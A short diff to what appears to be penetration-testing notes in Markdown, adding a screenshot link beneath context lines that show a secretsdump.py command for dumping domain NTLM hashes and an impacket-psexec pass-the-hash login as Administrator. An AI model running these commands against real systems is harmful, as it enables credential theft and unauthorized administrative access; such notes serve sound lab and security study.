@@ -400,4 +400,6 @@ secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:57c5a5bc7c0e1f98e9c9d81161e74c44 Administrator@192.168.232.129
 ```
 
+<img width="1339" height="400" alt="image" src="https://github.com/user-attachments/assets/5c37d770-99bc-4ffb-8f34-a5e5804d71c6" />
+
 -----------------
